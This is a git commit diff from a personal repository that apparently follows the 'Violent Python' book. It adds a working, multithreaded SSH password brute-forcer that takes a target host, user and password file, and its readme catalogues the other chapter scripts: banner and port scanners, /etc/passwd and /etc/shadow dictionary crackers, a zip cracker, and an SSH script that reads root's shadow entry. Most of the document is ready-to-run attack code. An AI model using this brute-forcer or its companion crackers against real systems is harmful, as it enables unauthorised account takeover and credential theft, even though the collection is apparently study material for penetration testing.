3bb34100dc734c6df0ddfa17cd8631b84ff7273f
David Higgins <thehig@gmail.com>
2015-07-28 00:27:46 +0100

    Updated Readme
    More file renaming

---
+++ chapter2/4.sshBrute.py
@@ -0,0 +1,70 @@
+import pxssh
+import optparse
+import time
+from threading import *
+
+maxConnections = 5
+connection_lock = BoundedSemaphore(value=maxConnections)
+Found = False
+Fails = 0
+
+def send_command(s, cmd):
+	s.sendline(cmd)
+	s.prompt()
+	return s.before
+
+def connect(host, user, password, release):
+	global Found
+	global Fails
+
+	try:
+		s = pxssh.pxssh()
+		s.login(host, user, password)
+		print '[+] Password found: ' + password
+		Found = True
+		return s
+	except Exception, e:
+		if 'read_nonblocking' in str(e):
+			Fails += 1
+			time.sleep(5)
+			connect(host, user, password, False)
+		elif 'synchronize with original prompt' in str(e):
+			time.sleep(1)
+			connect(host, user, password, False)
+	finally:
+		if release: connection_lock.release()
+
+def main():
+
+	parser = optparse.OptionParser('%prog -H <target host> -u <user> -F <password list>')
+
+	parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
+	parser.add_option('-F', dest='passwdFile', type='string', help='specify password file')
+	parser.add_option('-u', dest='user', type='string', help='specify the user')
+
+	(options, args) = parser.parse_args()
+
+	host = options.tgtHost
+	passwdFile = options.passwdFile
+	user = options.user
+
+	if host == None or passwdFile == None or user == None:
+		print parser.usage
+		exit(0)
+
+	pfileReader = open(passwdFile, 'r')
+	for line in pfileReader.readlines():
+		if Found:
+			print "[*] Exiting: Password found"
+			exit(0)
+		if Fails > 5:
+			print "[!] Exiting: Too many socket timeouts"
+			exit(0)
+		connection_lock.acquire()
+		password = line.strip('\r').strip('\n')
+		print "[-] Testing " + str(password)
+		t = Thread(target=connect, args=(host, user, password, True))
+		child = t.start()
+
+if __name__ == "__main__":
+	main()
--- readme.md
+++ readme.md
@@ -1,7 +1,27 @@
-# Requires vagrant to be running
+# Violent Python
 
-Chapter 1:
-	crack.py - Dictonary cracking of /etc/passwd (passwords.txt) file
-	crack2.py - Dictionary cracking of /etc/shadow (passwords2.txt)
+## Chapter 1: Introduction
 
-Passwords: https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/500-worst-passwords.txt
+| Filename      		| Explanation 
+| ------------- 		| -------------
+| 1.bannerChecker.py 	| Scans 192.168.95.[147-150] ports [21,22,25,80,110,443] looking for vulnerable banners (provided file parameter)
+| 2.crack.py 	      	| Brute force cracking of /etc/passwd (passwords.txt) using dictionary (dictionaries/dictionary.txt)
+| 3.crack_sha512.py 	| Dictionary cracking of /etc/shadow (shadow.txt) using all dictionaries (dictionaries/*.txt)
+| 4.zipCrack.py 		| Brute forces the provided zip file (evil.zip) with a dictionary file (dictionaries/dictionary.txt)
+
+## Chapter 2: Penetration Testing with Python
+
+| Filename      		| Explanation 
+| ------------- 		| -------------
+| 1.portScan.py 		| Scans a target host (-H) for provided ports (-p)
+| 2.nmapPortScan.py 	| Same as above, but uses nmap
+| 3.sshCommand.py 		| Uses pexpect to remote ssh into localhost as root with password vagrant. If successful, returns the output of 'cat /etc/shadow | grep root'
+| 4.sshBrute.py 		| Brute forces SSH attacks against a host (-H) as user (-u) with password dictionary (-F)
+
+## Misc
+
+
+Useful Links:
+* [Password lists](https://github.com/danielmiessler/SecLists)
+* [Outdated PenTools](https://github.com/ChrisFernandez/PenTools)
+* [Newer PenTools](https://github.com/HispaGatos/tools)
